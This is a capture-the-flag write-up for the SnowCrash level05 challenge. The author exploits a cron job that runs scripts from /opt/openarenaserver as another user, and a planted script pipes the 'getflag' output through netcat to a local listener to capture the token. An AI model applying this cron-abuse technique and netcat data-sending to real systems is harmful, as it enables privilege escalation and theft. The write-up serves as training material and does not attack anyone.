## level05

1. Check files in current working directory (home dir)
    - Nothing to see here

2. Checking what files I (`level05`) own (excluding `/proc/*`)
    - Nothing to see here

3. Checking what files is owned by the user `flag05`
    - `/usr/sbin/openarenaserver`
    - `/rofs/usr/sbin/openarenaserver`

`/usr/sbin/openarenaserver: POSIX shell script, ASCII text executable`

We can read the file using `cat` :

```bash
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver 
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

This script is pretty weird :

1. It loops over all files in `/opt/openarenaserver/`
2. It executes them using `bash -x` which will print the commands executed
3. It removes them


I'll be writing a quick script to check how it works, and because I have no idea on how to get the command output (let's say `getflag`) back to me.

```bash
#!/bin/bash
echo 'Hello' | nc 127.0.0.1 6969
```

And then listening on port 6969 using `nc -l 6969`. We cannot execute the `openarenaserver`, so we'll have to find a way.

I didn't even got time to search, the script executed itself automatically ? Probably a cronjob.

```
$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

```bash
level05@SnowCrash:~$ nc -l 6969
Hello
level05@SnowCrash:~$ cat /opt/openarenaserver/asdf
cat: /opt/openarenaserver/asdf: No such file or directory # <--- the file was removed
```

We will edit our cool script to execute `getflag` instead of `echo 'Hello'` :

```bash
#!/bin/bash
getflag | nc 127.0.0.1 6969
```

And wait !

```bash
level05@SnowCrash:~$ nc -l 6969
Check flag.Here is your token : viuaaale9huek52boumoomioc
```